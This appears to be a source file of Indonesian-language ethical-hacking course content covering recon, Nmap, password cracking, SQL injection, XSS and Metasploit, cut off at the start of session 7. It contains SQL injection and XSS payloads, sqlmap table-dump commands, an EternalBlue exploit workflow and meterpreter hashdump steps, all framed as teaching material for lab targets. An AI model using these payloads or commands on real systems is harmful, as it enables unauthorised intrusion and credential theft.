// Material/Theory content for each lab session
// Format yang lebih terstruktur dan mudah dipahami
export const labMaterials = {
  // Session 1: Introduction to Ethical Hacking & Reconnaissance
  session1: {
    theoryContent: `
# 🎓 Session 1: Pengenalan Ethical Hacking & Reconnaissance

<div class="intro-box">

## 🎯 Apa yang Akan Dipelajari?

Selamat datang di dunia **Ethical Hacking**! Di sesi ini, kamu akan mempelajari dasar-dasar hacking yang bertanggung jawab dan teknik reconnaissance (pengintaian).

</div>

---

## 📚 Bagian 1: Memahami Ethical Hacking

### 🤔 Apa itu Ethical Hacking?

**Ethical Hacking** adalah praktik menguji keamanan sistem dengan **izin resmi** dari pemiliknya. Bayangkan seperti "pencuri" yang dipekerjakan untuk menguji keamanan rumah - mereka mencari kelemahan agar bisa diperbaiki.

<div class="comparison-table">

### 🎭 Tipe-tipe Hacker

| 🎨 Tipe | 🎯 Tujuan | ⚖️ Legal? |
|---------|----------|-----------|
| **🤍 White Hat** | Membantu menemukan & memperbaiki celah keamanan | ✅ Legal (dengan izin) |
| **🖤 Black Hat** | Mengeksploitasi untuk keuntungan pribadi | ❌ Ilegal |
| **🩶 Grey Hat** | Campuran keduanya, niat baik tapi tanpa izin | ⚠️ Abu-abu |

</div>

> 💡 **Ingat**: Kamu harus SELALU mendapatkan izin tertulis sebelum melakukan pengujian keamanan!

---

## 📚 Bagian 2: Metodologi Penetration Testing

Setiap pentest profesional mengikuti 5 fase ini:

<div class="steps">

### 🔄 5 Fase Penetration Testing

**1️⃣ Reconnaissance (Pengintaian)**
> Mengumpulkan informasi tentang target tanpa menyentuhnya langsung

**2️⃣ Scanning & Enumeration**
> Mengidentifikasi port, layanan, dan versi yang berjalan

**3️⃣ Gaining Access (Eksploitasi)**
> Memanfaatkan kerentanan untuk masuk ke sistem

**4️⃣ Maintaining Access**
> Mempertahankan akses untuk pengujian lebih lanjut

**5️⃣ Reporting**
> Membuat laporan temuan dan rekomendasi

</div>

---

## 📚 Bagian 3: OSINT - Seni Mengumpulkan Informasi

### 🌐 Apa itu OSINT?

**OSINT** (Open Source Intelligence) adalah teknik mengumpulkan informasi dari sumber-sumber **publik dan legal**.

<div class="info-box">

### 🔍 Sumber-sumber OSINT

| 📂 Kategori | 📋 Contoh Sumber |
|-------------|------------------|
| **Domain & DNS** | WHOIS, nslookup, dig |
| **Search Engine** | Google Dorks, Shodan |
| **Social Media** | LinkedIn, Twitter, Facebook |
| **Code** | GitHub, GitLab (kredensial bocor) |
| **Arsip** | Wayback Machine |

</div>

### 🎯 Contoh Google Dorks

\`\`\`
# Mencari file PDF di suatu domain
site:example.com filetype:pdf

# Mencari halaman admin
inurl:admin site:example.com

# Mencari file yang berisi "password"
"password" filetype:txt site:example.com
\`\`\`

---

## 📚 Bagian 4: Tools yang Akan Digunakan

<div class="tools-grid">

### 🛠️ Arsenal Recon

| 🔧 Tool | 📝 Fungsi | 💻 Contoh |
|---------|-----------|-----------|
| \`whois\` | Cek info registrasi domain | \`whois google.com\` |
| \`nslookup\` | Query DNS dasar | \`nslookup google.com\` |
| \`dig\` | Query DNS advanced | \`dig google.com MX\` |
| \`host\` | DNS lookup simpel | \`host google.com\` |
| \`ping\` | Test konektivitas | \`ping 192.168.1.1\` |
| \`traceroute\` | Lacak jalur paket | \`traceroute google.com\` |

</div>

---

## ⚠️ Aspek Legal & Etika

<div class="warning-box">

### ✅ WAJIB Dilakukan:
- 📝 Dapatkan **izin tertulis** sebelum pengujian
- 📋 Dokumentasikan semua aktivitas
- 🔒 Jaga kerahasiaan data yang ditemukan
- 🎯 Tetap dalam scope yang disepakati

### ❌ DILARANG:
- 🚫 Mengakses sistem tanpa izin
- 🚫 Memodifikasi atau menghapus data
- 🚫 Menyebarkan informasi sensitif
- 🚫 Melakukan DoS attack

</div>

---

## 🎯 Tugas Praktikum Sesi Ini

<div class="task-box">

### 📋 Yang Harus Kamu Lakukan:

1. ✅ Lakukan **WHOIS lookup** pada target domain
2. ✅ Kumpulkan informasi **DNS** (A, MX, NS records)
3. ✅ Identifikasi **subdomain** yang ada
4. ✅ Dokumentasikan semua temuan

**🎯 Target**: example-company.com (192.168.1.100)

</div>

> 🔐 **Reminder**: Ini adalah lingkungan simulasi. Jangan pernah melakukan teknik ini pada sistem nyata tanpa izin!
`,
    prerequisites: [
      'Pemahaman dasar jaringan komputer (IP, DNS, HTTP)',
      'Familiar dengan command line Linux',
      'Pengetahuan dasar tentang protokol internet',
    ],
    resources: [
      { title: 'OWASP Testing Guide', url: 'https://owasp.org/www-project-web-security-testing-guide/', type: 'documentation' },
      { title: 'PTES - Penetration Testing Execution Standard', url: 'http://www.pentest-standard.org/', type: 'documentation' },
      { title: 'OSINT Framework', url: 'https://osintframework.com/', type: 'tool' },
      { title: 'Kali Linux Documentation', url: 'https://www.kali.org/docs/', type: 'documentation' },
    ],
    keyCommands: [
      { command: 'whois <domain>', description: 'Mencari informasi registrasi domain termasuk pemilik, tanggal registrasi, dan nameserver', example: 'whois example-company.com' },
      { command: 'nslookup <domain>', description: 'Query DNS untuk mendapatkan IP address dari domain', example: 'nslookup example-company.com' },
      { command: 'dig <domain> <record_type>', description: 'Advanced DNS query dengan berbagai tipe record (A, MX, NS, TXT)', example: 'dig example-company.com MX' },
      { command: 'host <domain>', description: 'Simple DNS lookup untuk mendapatkan IP dan mail server', example: 'host example-company.com' },
      { command: 'ping <target>', description: 'Test konektivitas ke target dan mengukur latency', example: 'ping 192.168.1.100' },
      { command: 'traceroute <target>', description: 'Melacak jalur paket ke target melalui berbagai router', example: 'traceroute example-company.com' },
    ],
  },

  // Session 2: Network Scanning with Nmap
  session2: {
    theoryContent: `
# 🔍 Session 2: Network Scanning dengan Nmap

<div class="intro-box">

## 🎯 Apa yang Akan Dipelajari?

Di sesi ini kamu akan mempelajari cara melakukan **network scanning** menggunakan **Nmap**, tool paling powerful untuk memetakan jaringan dan menemukan layanan yang berjalan.

</div>

---

## 📚 Bagian 1: Pengantar Network Scanning

### 🌐 Apa itu Network Scanning?

**Network Scanning** adalah proses mengidentifikasi:
- 🖥️ Host yang aktif di jaringan
- 🚪 Port yang terbuka
- 📦 Layanan yang berjalan
- 💻 Sistem operasi target

<div class="info-box">

### 🛠️ Nmap (Network Mapper)

**Nmap** adalah tool scanning paling populer dengan kemampuan:
- ✅ Host discovery (menemukan host aktif)
- ✅ Port scanning (mengecek port terbuka)
- ✅ Service detection (mendeteksi layanan)
- ✅ OS detection (mendeteksi sistem operasi)
- ✅ Vulnerability scanning (dengan NSE scripts)

</div>

---

## 📚 Bagian 2: Jenis-jenis Port Scan

### 🔌 1. TCP Connect Scan (\`-sT\`)

\`\`\`
┌─────────┐     SYN      ┌─────────┐
│ Scanner │────────────▶ │ Target  │
│         │◀────────────│         │
└─────────┘   SYN/ACK    └─────────┘
     │                        
     └──────── ACK ──────────▶ (Koneksi terbentuk)
\`\`\`

**Karakteristik:**
- ✅ Full TCP 3-way handshake
- ✅ Paling akurat
- ⚠️ Mudah terdeteksi oleh firewall
- ✅ Tidak perlu root privilege

### ⚡ 2. SYN Scan (\`-sS\`) - "Stealth Scan"

\`\`\`
┌─────────┐     SYN      ┌─────────┐
│ Scanner │────────────▶ │ Target  │
│         │◀────────────│         │
└─────────┘   SYN/ACK    └─────────┘
     │                        
     └──────── RST ──────────▶ (Koneksi dibatalkan)
\`\`\`

**Karakteristik:**
- ✅ Half-open scan (tidak selesai handshake)
- ✅ Lebih cepat
- ✅ Lebih sulit terdeteksi
- ⚠️ Memerlukan root privilege

### 📡 3. UDP Scan (\`-sU\`)

- Scan port UDP (DNS, SNMP, DHCP)
- ⚠️ Lebih lambat dari TCP scan
- Penting untuk layanan berbasis UDP

---

## 📚 Bagian 3: Memahami Port States

<div class="comparison-table">

### 🚦 Status Port

| 🎨 State | 📝 Arti | 🔍 Penjelasan |
|----------|---------|---------------|
| **🟢 open** | Terbuka | Ada layanan yang aktif menerima koneksi |
| **🔴 closed** | Tertutup | Accessible tapi tidak ada layanan |
| **🟡 filtered** | Difilter | Firewall memblokir, tidak bisa dipastikan |
| **⚪ unfiltered** | Tidak difilter | Accessible, tapi status tidak jelas |

</div>

---

## 📚 Bagian 4: Port-port Penting

<div class="tools-grid">

### 🚪 Common Ports yang Wajib Diingat

| Port | Service | Deskripsi |
|------|---------|-----------|
| **22** | SSH | Remote access aman |
| **80** | HTTP | Web server |
| **443** | HTTPS | Web server (encrypted) |
| **21** | FTP | Transfer file |
| **23** | Telnet | Remote access (tidak aman!) |
| **25** | SMTP | Kirim email |
| **53** | DNS | Domain name resolution |
| **3306** | MySQL | Database |
| **445** | SMB | File sharing Windows |
| **3389** | RDP | Remote Desktop Windows |

</div>

---

## 📚 Bagian 5: Teknik-teknik Nmap

### 🔍 Host Discovery

\`\`\`bash
# Ping scan - hanya cek host aktif (tanpa port scan)
nmap -sn 192.168.1.0/24

# Skip host discovery (anggap host aktif)
nmap -Pn 192.168.1.100
\`\`\`

### 🚪 Port Scanning

\`\`\`bash
# Scan 1000 port paling umum (default)
nmap 192.168.1.100

# Scan SEMUA port (65535)
nmap -p- 192.168.1.100

# Scan port tertentu
nmap -p 22,80,443 192.168.1.100

# Scan range port
nmap -p 1-1000 192.168.1.100
\`\`\`

### 🔎 Service & Version Detection

\`\`\`bash
# Deteksi versi service
nmap -sV 192.168.1.100

# Deteksi OS
nmap -O 192.168.1.100

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 192.168.1.100
\`\`\`

---

## ⏱️ Timing Templates

<div class="info-box">

### 🎚️ Pengaturan Kecepatan Scan

| Template | Nama | Penggunaan |
|----------|------|------------|
| \`-T0\` | Paranoid | IDS evasion, sangat lambat |
| \`-T1\` | Sneaky | IDS evasion |
| \`-T2\` | Polite | Tidak membebani jaringan |
| \`-T3\` | Normal | Default |
| **\`-T4\`** | **Aggressive** | **Recommended untuk lab** |
| \`-T5\` | Insane | Sangat cepat, mungkin kurang akurat |

</div>

---

## 🎯 Tugas Praktikum Sesi Ini

<div class="task-box">

### 📋 Yang Harus Kamu Lakukan:

1. ✅ Lakukan **ping scan** untuk menemukan host aktif
2. ✅ Lakukan **SYN scan** pada target
3. ✅ **Deteksi versi** service yang berjalan
4. ✅ **Identifikasi OS** target
5. ✅ Dokumentasikan semua port dan service

**🎯 Target**: 192.168.1.100 (web.example-company.com)

</div>

> 💡 **Tips**: Gunakan \`-T4\` untuk scan lebih cepat dan \`-v\` untuk output verbose!
`,
    prerequisites: [
      'Pemahaman TCP/IP dan model OSI',
      'Pengetahuan tentang port dan protokol',
      'Pengalaman dengan command line',
      'Menyelesaikan Session 1 (Reconnaissance)',
    ],
    resources: [
      { title: 'Nmap Official Documentation', url: 'https://nmap.org/docs.html', type: 'documentation' },
      { title: 'Nmap Cheat Sheet', url: 'https://www.stationx.net/nmap-cheat-sheet/', type: 'cheatsheet' },
      { title: 'Nmap NSE Scripts', url: 'https://nmap.org/nsedoc/', type: 'documentation' },
    ],
    keyCommands: [
      { command: 'nmap -sn <target>', description: 'Ping scan - hanya cek host aktif tanpa port scan', example: 'nmap -sn 192.168.1.0/24' },
      { command: 'nmap -sS <target>', description: 'SYN scan (stealth) - half-open scan yang cepat dan tidak mudah terdeteksi', example: 'nmap -sS 192.168.1.100' },
      { command: 'nmap -sV <target>', description: 'Version detection - identifikasi versi service yang berjalan', example: 'nmap -sV 192.168.1.100' },
      { command: 'nmap -O <target>', description: 'OS detection - identifikasi sistem operasi target', example: 'nmap -O 192.168.1.100' },
      { command: 'nmap -A <target>', description: 'Aggressive scan - gabungan OS detection, version, scripts, traceroute', example: 'nmap -A 192.168.1.100' },
      { command: 'nmap -p <ports> <target>', description: 'Scan port spesifik atau range', example: 'nmap -p 22,80,443 192.168.1.100' },
    ],
  },

  // Session 3: Vulnerability Assessment & Password Cracking
  session3: {
    theoryContent: `
# 🔐 Session 3: Vulnerability Assessment & Password Cracking

<div class="intro-box">

## 🎯 Apa yang Akan Dipelajari?

Di sesi ini kamu akan mempelajari cara **mengidentifikasi kerentanan** dan teknik dasar **password cracking** menggunakan berbagai tools.

</div>

---

## 📚 Bagian 1: Vulnerability Assessment

### 🔍 Apa itu Vulnerability Assessment?

**Vulnerability Assessment** adalah proses sistematis untuk:
- 🔎 Mengidentifikasi kelemahan keamanan
- 📊 Mengklasifikasi tingkat risiko
- 📋 Memprioritaskan perbaikan

---

## 📚 Bagian 2: CVE & CVSS - Standar Industri

### 🏷️ CVE (Common Vulnerabilities and Exposures)

CVE adalah sistem penamaan standar untuk kerentanan.

**Format**: \`CVE-TAHUN-NOMOR\`

**Contoh:**
- \`CVE-2021-44228\` - Log4Shell (sangat terkenal!)
- \`CVE-2017-0144\` - EternalBlue

### 📊 CVSS (Common Vulnerability Scoring System)

<div class="comparison-table">

### 🎚️ Skala Severity CVSS

| Skor | Severity | Prioritas |
|------|----------|-----------|
| **9.0 - 10.0** | 🔴 Critical | Perbaiki SEGERA! |
| **7.0 - 8.9** | 🟠 High | Prioritas tinggi |
| **4.0 - 6.9** | 🟡 Medium | Dijadwalkan |
| **0.1 - 3.9** | 🟢 Low | Ketika sempat |

</div>

---

## 📚 Bagian 3: Tools Vulnerability Scanning

### 🔍 Searchsploit

Tool untuk mencari exploit dari database Exploit-DB.

\`\`\`bash
# Cari exploit untuk Apache 2.4
searchsploit apache 2.4

# Copy exploit ke folder saat ini
searchsploit -m 12345

# Update database
searchsploit --update
\`\`\`

### 🕷️ Nikto (Web Scanner)

\`\`\`bash
# Scan web server
nikto -h http://target.com

# Scan port custom
nikto -h target -p 8080
\`\`\`

---

## 📚 Bagian 4: Password Cracking

### 🔑 Jenis-jenis Hash

<div class="tools-grid">

| 🔐 Algoritma | 📏 Panjang | 📝 Contoh |
|--------------|-----------|-----------|
| **MD5** | 32 karakter | \`5d41402abc4b2a76b9719d911017c592\` |
| **SHA-1** | 40 karakter | \`aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d\` |
| **SHA-256** | 64 karakter | \`2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e...\` |
| **bcrypt** | 60 karakter | \`$2a$10$...\` |

</div>

### 🔍 Hashid - Identifikasi Tipe Hash

\`\`\`bash
# Identifikasi hash MD5
hashid '5d41402abc4b2a76b9719d911017c592'

# Tampilkan mode hashcat
hashid -m '$2a$10$...'
\`\`\`

---

## 📚 Bagian 5: John the Ripper

### 🔨 Tool Password Cracking Legendaris

\`\`\`bash
# Crack dengan wordlist default
john hashes.txt

# Crack dengan wordlist custom
john --wordlist=rockyou.txt hashes.txt

# Lihat password yang sudah di-crack
john --show hashes.txt
\`\`\`

### ⚔️ Jenis Attack

<div class="info-box">

**1️⃣ Dictionary Attack**
> Menggunakan daftar kata yang umum dipakai sebagai password
> Contoh wordlist: rockyou.txt (14 juta+ password!)

**2️⃣ Brute Force Attack**
> Mencoba SEMUA kombinasi karakter
> Sangat lambat tapi pasti

**3️⃣ Rule-based Attack**
> Dictionary + aturan modifikasi
> Contoh: password → P@ssw0rd, password123

</div>

---

## 🛡️ Tips Password Security

<div class="warning-box">

### ✅ DO's:
- 🔑 Minimal 12 karakter
- 🔄 Kombinasi huruf, angka, simbol
- 🔐 Gunakan password manager
- 📱 Aktifkan 2FA

### ❌ DON'Ts:
- 🚫 Gunakan info personal (tanggal lahir, nama)
- 🚫 Reuse password di banyak situs
- 🚫 Gunakan password umum (123456, password)

</div>

---

## 🎯 Tugas Praktikum Sesi Ini

<div class="task-box">

### 📋 Yang Harus Kamu Lakukan:

1. ✅ Cari kerentanan dengan **searchsploit**
2. ✅ Identifikasi jenis hash dengan **hashid**
3. ✅ Crack password dengan **John the Ripper**
4. ✅ Dokumentasikan temuan dan rekomendasi

**🎯 Target Hash**: \`5d41402abc4b2a76b9719d911017c592\` (MD5)

</div>

> ⚠️ **Etika**: Password cracking hanya boleh dilakukan pada hash yang kamu miliki izin untuk crack!
`,
    prerequisites: [
      'Menyelesaikan Session 1 dan 2',
      'Pemahaman dasar kriptografi',
      'Familiar dengan konsep hashing',
      'Pengetahuan tentang authentication',
    ],
    resources: [
      { title: 'CVE Database', url: 'https://cve.mitre.org/', type: 'database' },
      { title: 'Exploit Database', url: 'https://www.exploit-db.com/', type: 'database' },
      { title: 'John the Ripper Wiki', url: 'https://www.openwall.com/john/doc/', type: 'documentation' },
      { title: 'CrackStation', url: 'https://crackstation.net/', type: 'tool' },
    ],
    keyCommands: [
      { command: 'searchsploit <keyword>', description: 'Mencari exploit berdasarkan keyword di Exploit-DB', example: 'searchsploit apache 2.4' },
      { command: 'hashid <hash>', description: 'Mengidentifikasi jenis/algoritma hash', example: "hashid '5d41402abc4b2a76b9719d911017c592'" },
      { command: 'john --wordlist=<file> <hashes>', description: 'Crack password hash menggunakan wordlist', example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
      { command: 'john --show <hashes>', description: 'Menampilkan password yang sudah di-crack', example: 'john --show hashes.txt' },
      { command: 'nikto -h <target>', description: 'Scan web server untuk kerentanan umum', example: 'nikto -h http://192.168.1.100' },
    ],
  },

  // Session 4: UTS
  session4: {
    theoryContent: `
# 📝 Session 4: UTS - Reconnaissance & Scanning Project

<div class="intro-box">

## 🎯 Ujian Tengah Semester

Saatnya menguji kemampuanmu! UTS ini menggabungkan semua yang telah kamu pelajari di Session 1-3.

</div>

---

## 📋 Informasi Ujian

<div class="info-box">

### 📊 Detail UTS

| 📌 Item | 📝 Keterangan |
|---------|---------------|
| **Durasi** | 120 menit |
| **Target** | demo-company.com (10.0.0.50) |
| **IP Range** | 10.0.0.0/24 |
| **Format** | Praktikum + Laporan |

</div>

---

## 📊 Rubrik Penilaian

<div class="comparison-table">

| 📋 Komponen | 📊 Bobot | 📝 Kriteria |
|-------------|----------|-------------|
| **OSINT Gathering** | 25% | Kelengkapan informasi |
| **Network Scanning** | 25% | Akurasi hasil scanning |
| **Vulnerability ID** | 25% | Identifikasi kerentanan |
| **Report Quality** | 25% | Profesionalisme laporan |

</div>

---

## 📝 Deliverables

1. **Laporan OSINT** tentang target
2. **Hasil network scanning** lengkap
3. **Daftar kerentanan** yang ditemukan
4. **Rekomendasi mitigasi**

---

## ⚠️ Peraturan

<div class="warning-box">

### ✅ Diperbolehkan:
- Menggunakan semua tools dari Session 1-3
- Dokumentasi setiap langkah

### ❌ Dilarang:
- Serangan DoS
- Modifikasi/hapus data
- Berbagi jawaban

</div>

---

## 💡 Tips Sukses

1. 📖 Baca instruksi dengan teliti
2. 🔍 Reconnaissance menyeluruh dulu
3. 📝 Dokumentasikan semua command
4. 📊 Prioritaskan temuan berdasarkan severity
5. ✅ Review laporan sebelum submit

> 🍀 **Good luck!** Tunjukkan kemampuan terbaikmu!
`,
    prerequisites: [
      'Menyelesaikan Session 1, 2, dan 3',
      'Memahami metodologi penetration testing',
      'Familiar dengan semua tools yang telah dipelajari',
      'Kemampuan menulis laporan teknis',
    ],
    resources: [
      { title: 'Penetration Testing Report Template', url: '#', type: 'template' },
      { title: 'PTES Reporting Guidelines', url: 'http://www.pentest-standard.org/index.php/Reporting', type: 'documentation' },
    ],
    keyCommands: [
      { command: 'Semua command dari Session 1-3', description: 'Review kembali semua perintah yang telah dipelajari', example: 'whois, nslookup, nmap, searchsploit, dll' },
    ],
  },

  // Session 5: Web Application Security & SQL Injection
  session5: {
    theoryContent: `
# 🌐 Session 5: Web Application Security & SQL Injection

<div class="intro-box">

## 🎯 Apa yang Akan Dipelajari?

Di sesi ini kamu akan mempelajari keamanan aplikasi web, terutama **SQL Injection** - salah satu kerentanan paling berbahaya di web!

</div>

---

## 📚 Bagian 1: OWASP Top 10

<div class="comparison-table">

### 🔝 10 Kerentanan Web Teratas (2021)

| Rank | 🔍 Vulnerability | ⚠️ Risiko |
|------|------------------|-----------|
| **1** | Broken Access Control | 🔴 Kritis |
| **2** | Cryptographic Failures | 🔴 Kritis |
| **3** | **Injection (SQL, dll)** | 🔴 Kritis |
| **4** | Insecure Design | 🟠 Tinggi |
| **5** | Security Misconfiguration | 🟠 Tinggi |
| **6** | Vulnerable Components | 🟡 Sedang |
| **7** | Authentication Failures | 🟠 Tinggi |
| **8** | Software Integrity Failures | 🟡 Sedang |
| **9** | Logging & Monitoring Failures | 🟡 Sedang |
| **10** | SSRF | 🟡 Sedang |

</div>

---

## 📚 Bagian 2: SQL Injection

### 💉 Apa itu SQL Injection?

SQL Injection terjadi ketika input user langsung dimasukkan ke query SQL tanpa sanitasi.

<div class="warning-box">

### ❌ Kode Vulnerable (Jangan Ditiru!)

\`\`\`php
// BERBAHAYA! Input user langsung masuk query
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
\`\`\`

</div>

### ⚔️ Teknik-teknik SQL Injection

#### 1️⃣ Authentication Bypass

\`\`\`
Username: admin' --
Password: apapun

Query menjadi:
SELECT * FROM users WHERE username='admin' --' AND password='apapun'
                                            ^^ sisa query jadi komentar!
\`\`\`

#### 2️⃣ UNION-based SQLi

\`\`\`
id=1 UNION SELECT username,password FROM users--
\`\`\`

#### 3️⃣ Boolean-based Blind SQLi

\`\`\`
id=1 AND 1=1  → Response normal (true)
id=1 AND 1=2  → Response berbeda (false)
\`\`\`

#### 4️⃣ Time-based Blind SQLi

\`\`\`
id=1; WAITFOR DELAY '0:0:5'--  → Delay 5 detik jika vulnerable
\`\`\`

---

## 📚 Bagian 3: SQLMap

### 🔧 Tool Otomatis untuk SQL Injection

\`\`\`bash
# Test vulnerability & enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump data dari table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
\`\`\`

<div class="info-box">

### 📌 Common SQLMap Options

| Option | Fungsi |
|--------|--------|
| \`-u\` | Target URL dengan parameter |
| \`--dbs\` | List semua database |
| \`--tables\` | List semua table |
| \`--dump\` | Dump isi table |
| \`-D <db>\` | Pilih database |
| \`-T <table>\` | Pilih table |
| \`--batch\` | Mode non-interaktif |

</div>

---

## 📚 Bagian 4: Cross-Site Scripting (XSS)

### 🕷️ Jenis-jenis XSS

1. **Reflected XSS** - Payload dari URL langsung direfleksikan
2. **Stored XSS** - Payload disimpan di database
3. **DOM-based XSS** - Dieksekusi di client-side

### 💣 Contoh Payload XSS

\`\`\`html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
\`\`\`

---

## 📚 Bagian 5: Directory Bruteforce

### 📂 Dirb

\`\`\`bash
# Bruteforce directory
dirb http://target.com /usr/share/dirb/wordlists/common.txt

# Save output
dirb http://target.com -o results.txt
\`\`\`

### 📁 Directory yang Sering Dicari

\`\`\`
/admin, /login, /dashboard, /api
/backup, /config, /uploads, /.git
/robots.txt, /sitemap.xml
\`\`\`

---

## 🎯 Tugas Praktikum Sesi Ini

<div class="task-box">

### 📋 Yang Harus Kamu Lakukan:

1. ✅ Identifikasi titik SQL Injection
2. ✅ Gunakan SQLMap untuk enumerate database
3. ✅ Extract informasi sensitif
4. ✅ Uji kerentanan XSS
5. ✅ Lakukan directory enumeration

**🎯 Target**: http://192.168.1.100

</div>

> ⚠️ **Peringatan**: Hanya lakukan pada sistem yang kamu miliki izin!
`,
    prerequisites: [
      'Menyelesaikan Session 1-4',
      'Pemahaman HTTP/HTTPS protocol',
      'Pengetahuan dasar SQL',
      'Familiar dengan HTML/JavaScript',
    ],
    resources: [
      { title: 'OWASP Top 10', url: 'https://owasp.org/Top10/', type: 'documentation' },
      { title: 'SQLMap User Manual', url: 'https://github.com/sqlmapproject/sqlmap/wiki/Usage', type: 'documentation' },
      { title: 'PortSwigger Web Security Academy', url: 'https://portswigger.net/web-security', type: 'course' },
      { title: 'XSS Cheat Sheet', url: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet', type: 'cheatsheet' },
    ],
    keyCommands: [
      { command: 'sqlmap -u <url> --dbs', description: 'Scan URL untuk SQL injection dan enumerate database', example: 'sqlmap -u "http://target.com/page?id=1" --dbs' },
      { command: 'sqlmap -u <url> -D <db> --tables', description: 'Enumerate tables dalam database', example: 'sqlmap -u "http://target.com/page?id=1" -D users_db --tables' },
      { command: 'sqlmap -u <url> -D <db> -T <table> --dump', description: 'Dump data dari table', example: 'sqlmap -u "http://target.com/page?id=1" -D users_db -T users --dump' },
      { command: 'dirb <url> <wordlist>', description: 'Directory bruteforce untuk menemukan hidden files/folders', example: 'dirb http://target.com /usr/share/dirb/wordlists/common.txt' },
      { command: 'test-xss <url>', description: 'Test untuk kerentanan XSS pada URL', example: 'test-xss http://target.com/search?q=test' },
    ],
  },

  // Session 6: Metasploit Framework & Privilege Escalation
  session6: {
    theoryContent: `
# ⚔️ Session 6: Metasploit Framework & Privilege Escalation

<div class="intro-box">

## 🎯 Apa yang Akan Dipelajari?

Di sesi ini kamu akan mempelajari **Metasploit** - framework exploitation paling powerful, dan teknik **Privilege Escalation** untuk meningkatkan akses.

</div>

---

## 📚 Bagian 1: Pengantar Metasploit

### 🗡️ Apa itu Metasploit?

**Metasploit Framework** adalah platform penetration testing dengan:
- 📦 Database exploit komprehensif
- 🎯 Payload generation
- 🔧 Post-exploitation tools
- 🛡️ Evasion techniques

### 🏗️ Arsitektur Metasploit

\`\`\`
┌─────────────────────────────────────────┐
│           Metasploit Framework          │
├─────────────────────────────────────────┤
│  Exploits  │  Payloads  │   Auxiliary   │
├────────────┼────────────┼───────────────┤
│  Encoders  │    Nops    │     Post      │
└─────────────────────────────────────────┘
\`\`\`

<div class="comparison-table">

### 📦 Jenis-jenis Module

| Module | Fungsi |
|--------|--------|
| **Exploits** | Memanfaatkan kerentanan |
| **Payloads** | Kode yang dieksekusi setelah exploit |
| **Auxiliary** | Scanner, fuzzer, dll |
| **Post** | Post-exploitation |
| **Encoders** | Obfuscate payload |

</div>

---

## 📚 Bagian 2: Basic Workflow

### 🚀 Langkah-langkah Menggunakan Metasploit

\`\`\`bash
# 1. Start Metasploit
msfconsole

# 2. Search exploit
msf6 > search type:exploit windows smb
msf6 > search cve:2017-0144

# 3. Use exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 4. View options
msf6 exploit(ms17_010) > show options

# 5. Configure
msf6 exploit(ms17_010) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010) > set LHOST 192.168.1.50

# 6. Execute!
msf6 exploit(ms17_010) > exploit
\`\`\`

---

## 📚 Bagian 3: Meterpreter

### 🐚 Shell Terkuat

**Meterpreter** adalah advanced payload yang berjalan di memori.

\`\`\`bash
# Core Commands
meterpreter > sysinfo          # Info sistem
meterpreter > getuid           # User saat ini
meterpreter > getsystem        # Escalate ke SYSTEM
meterpreter > hashdump         # Dump password hashes
meterpreter > shell            # Drop ke system shell

# File Operations
meterpreter > pwd              # Current directory
meterpreter > ls               # List files
meterpreter > download file    # Download file
meterpreter > upload file      # Upload file

# Process Management
meterpreter > ps               # List processes
meterpreter > migrate PID      # Pindah ke process lain
meterpreter > background       # Background session
\`\`\`

---

## 📚 Bagian 4: Privilege Escalation

### 📈 Windows PrivEsc

\`\`\`bash
# Menggunakan getsystem
meterpreter > getsystem

# Cari exploit lokal
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
\`\`\`

**Teknik Umum:**
- 🔧 Unquoted service paths
- 🔐 Weak service permissions
- 📚 DLL hijacking
- 🎭 Token impersonation

### 🐧 Linux PrivEsc

\`\`\`bash
# Cari SUID binaries
find / -perm -4000 2>/dev/null

# Cek sudo permissions
sudo -l

# Cek kernel version
uname -a
searchsploit linux kernel 4.4.0
\`\`\`

---

## 🔥 Exploit Terkenal

<div class="comparison-table">

| CVE | Nama | Target |
|-----|------|--------|
| **CVE-2017-0144** | EternalBlue | Windows SMB |
| **CVE-2014-6271** | Shellshock | Bash |
| **CVE-2021-44228** | Log4Shell | Java |
| **CVE-2019-0708** | BlueKeep | Windows RDP |

</div>

---

## 🎯 Tugas Praktikum Sesi Ini

<div class="task-box">

### 📋 Yang Harus Kamu Lakukan:

1. ✅ Launch msfconsole
2. ✅ Search dan select exploit
3. ✅ Configure dan execute
4. ✅ Lakukan privilege escalation
5. ✅ Collect information dari system

**🎯 Target**: 192.168.1.100 (Windows Server)

</div>

> ⚠️ **Peringatan**: Metasploit sangat powerful. Gunakan dengan bijak!
`,
    prerequisites: [
      'Menyelesaikan Session 1-5',
      'Pemahaman networking TCP/IP',
      'Pengetahuan tentang operating systems',
      'Familiar dengan vulnerabilities dan CVE',
    ],
    resources: [
      { title: 'Metasploit Unleashed', url: 'https://www.offensive-security.com/metasploit-unleashed/', type: 'course' },
      { title: 'Metasploit Documentation', url: 'https://docs.metasploit.com/', type: 'documentation' },
      { title: 'GTFOBins (Linux PrivEsc)', url: 'https://gtfobins.github.io/', type: 'tool' },
      { title: 'LOLBAS (Windows PrivEsc)', url: 'https://lolbas-project.github.io/', type: 'tool' },
    ],
    keyCommands: [
      { command: 'msfconsole', description: 'Start Metasploit Framework console', example: 'msfconsole' },
      { command: 'search <keyword>', description: 'Search for exploits, payloads, atau modules', example: 'search type:exploit windows smb' },
      { command: 'use <module>', description: 'Select module yang akan digunakan', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
      { command: 'show options', description: 'Display settings yang diperlukan', example: 'show options' },
      { command: 'set <option> <value>', description: 'Set nilai untuk option', example: 'set RHOSTS 192.168.1.100' },
      { command: 'exploit / run', description: 'Execute module saat ini', example: 'exploit' },
      { command: 'sessions', description: 'List active sessions', example: 'sessions -l' },
    ],
  },

  // Session 7: Report Writing, Social Engineering & CTF
  session7: {
    theoryContent: `
# 📝 Session 7: Report Writing, Social Engineering & CTF

<div class="intro-box">

## 🎯 Apa yang Akan Dipelajari?

